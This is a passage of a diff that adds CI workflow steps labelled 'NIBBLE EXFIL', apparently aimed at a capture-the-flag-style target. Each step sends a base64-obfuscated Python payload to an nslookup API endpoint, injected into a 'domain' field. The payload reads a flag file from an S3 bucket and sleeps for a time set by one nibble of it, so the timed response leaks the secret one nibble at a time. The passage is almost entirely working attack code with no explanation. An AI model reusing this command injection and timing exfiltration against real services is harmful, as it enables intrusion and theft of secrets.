+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTBdJjB4ZikrMikKZXhjZXB0OgogICAgcGFzcw=="
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[10] LO: ${MS}ms => nibble=$((MS/1000-2))"
+
+      - name: NIBBLE EXFIL byte[11] hi-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTFdPj40KSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[11] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
+
+      - name: NIBBLE EXFIL byte[11] lo-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTFdJjB4ZikrMikKZXhjZXB0OgogICAgcGFzcw=="
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[11] LO: ${MS}ms => nibble=$((MS/1000-2))"
+
+      - name: NIBBLE EXFIL byte[12] hi-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTJdPj40KSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[12] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
+
+      - name: NIBBLE EXFIL byte[12] lo-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTJdJjB4ZikrMikKZXhjZXB0OgogICAgcGFzcw=="
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[12] LO: ${MS}ms => nibble=$((MS/1000-2))"
+
+      - name: NIBBLE EXFIL byte[13] hi-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTNdPj40KSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[13] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
+
+      - name: NIBBLE EXFIL byte[13] lo-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTNdJjB4ZikrMikKZXhjZXB0OgogICAgcGFzcw=="
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[13] LO: ${MS}ms => nibble=$((MS/1000-2))"
+
+      - name: NIBBLE EXFIL byte[14] hi-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTRdPj40KSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[14] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
+
+      - name: NIBBLE EXFIL byte[14] lo-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTRdJjB4ZikrMikKZXhjZXB0OgogICAgcGFzcw=="
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[14] LO: ${MS}ms => nibble=$((MS/1000-2))"
+
+      - name: NIBBLE EXFIL byte[15] hi-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTVdPj40KSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[15] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
+
+      - name: NIBBLE EXFIL byte[15] lo-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTVdJjB4ZikrMikKZXhjZXB0OgogICAgcGFzcw=="
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[15] LO: ${MS}ms => nibble=$((MS/1000-2))"
